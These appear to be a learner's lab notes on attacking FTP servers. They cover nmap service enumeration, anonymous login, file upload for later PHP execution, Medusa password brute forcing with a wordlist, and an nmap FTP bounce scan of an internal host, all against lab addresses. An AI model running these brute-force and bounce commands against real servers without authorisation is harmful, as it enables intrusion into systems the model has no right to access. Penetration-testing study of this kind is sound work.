By default, FTP listens on port `TCP/21`

To attack an FTP Server, we can abuse
- misconfiguration or excessive privileges, 
- exploit known vulnerabilities or discover new vulnerabilities

---
### Enumeration

```shell-session
sudo nmap -sC -sV 192.168.2.142
```

```shell-session
sudo nmap -sC -sV -p 21 192.168.2.142
```

```shell-session
sudo nmap -sV -Pn -p 21 --script "ftp-*" 192.168.2.142

- Pn: Skip host discovery
```

![[Pasted image 20250926221551.png]]

---
### Misconfigurations

#### Anonymous Authentication

To access with anonymous login, we can use the **anonymous** username and no password

```shell-session
hellopriyanshu2702@htb[/htb]$ ftp 192.168.2.142    
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

![[Pasted image 20250926215001.png]]

if this is successful, we can
- enable us to download this sensitive information or even upload dangerous scripts
- Using other vulnerabilities, such as path traversal in a web application, we would be able to find out where this file is located and execute it as PHP code, for example.

USE
- cd / ls to move around
- get, mget to download
- put, mput to upload
- help for more info
- ![[Pasted image 20250926215447.png]]

---
### FTP Specific attacks

#### Brute Forcing with Medusa

![[Pasted image 20250926221215.png]]

```shell-session
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -n 2121 -M ftp -t 10 -n 2121

u: Username
U: Username Wordlist
P: Password list
h: host
M: module (ftp)
n: port number
t: thread
```


#### FTP Bounce attack

(Consider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ` using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.)

```shell-session
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213:21 172.17.0.2
b: bounce
n: no dns resolution
Pn: host is definately on
v: verbose
ftp: anonymous:password@10.10.110.213:21
target: 172.17.0.2
```

---

